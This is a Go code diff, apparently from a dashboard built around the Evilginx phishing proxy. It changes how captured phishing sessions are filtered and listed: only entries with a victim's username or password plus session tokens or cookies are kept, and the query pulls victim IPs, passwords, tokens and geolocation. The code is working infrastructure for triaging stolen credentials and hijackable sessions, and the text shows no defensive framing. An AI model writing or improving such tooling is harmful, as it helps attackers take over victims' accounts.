@@ -1554,11 +1554,16 @@ func fetchEvilginxSessions() []Event {
 	// Convert to Event format
 	var events []Event
 	for _, s := range sessions {
-		// Only include sessions with credentials or tokens
-		hasCredentials := s.Username != "" && s.Password != ""
+		// Only include sessions with meaningful authentication data
+		// Must have: (username OR password) AND cookies/tokens
+		// This filters out sessions with only request cookies (no auth data)
+		hasUsername := s.Username != "" && s.Username != "N/A"
+		hasPassword := s.Password != "" && s.Password != "N/A"
 		hasTokens := s.Tokens != "" && s.Tokens != "{}" && s.Tokens != "null"
 
-		if !hasCredentials && !hasTokens {
+		// Require at least one credential (username OR password) AND tokens
+		hasCredentialInfo := hasUsername || hasPassword
+		if !hasCredentialInfo || !hasTokens {
 			continue
 		}
 
@@ -1596,13 +1601,14 @@ func getCredentials(w http.ResponseWriter, r *http.Request) {
 	evilginxSessions := fetchEvilginxSessions()
 
 	// Also get credentials from our local events database
+	// Only show sessions with at least username/password AND cookies
 	rows, err := db.Query(`
 		SELECT id, timestamp, type, phishlet, ip, username, password, session_id, tokens,
 		       geo_city, geo_country, geo_lat, geo_lon, score, message, COALESCE(rid, '')
 		FROM events
 		WHERE (
-			(type = 'credentials' AND username != '' AND password != '')
-			OR (type = 'session' AND tokens != '' AND tokens != '{}' AND tokens != 'null')
+			(username != '' AND username != 'N/A' AND tokens != '' AND tokens != '{}' AND tokens != 'null')
+			OR (password != '' AND password != 'N/A' AND tokens != '' AND tokens != '{}' AND tokens != 'null')
 		)
 		ORDER BY timestamp DESC LIMIT 500`)
 	if err != nil {
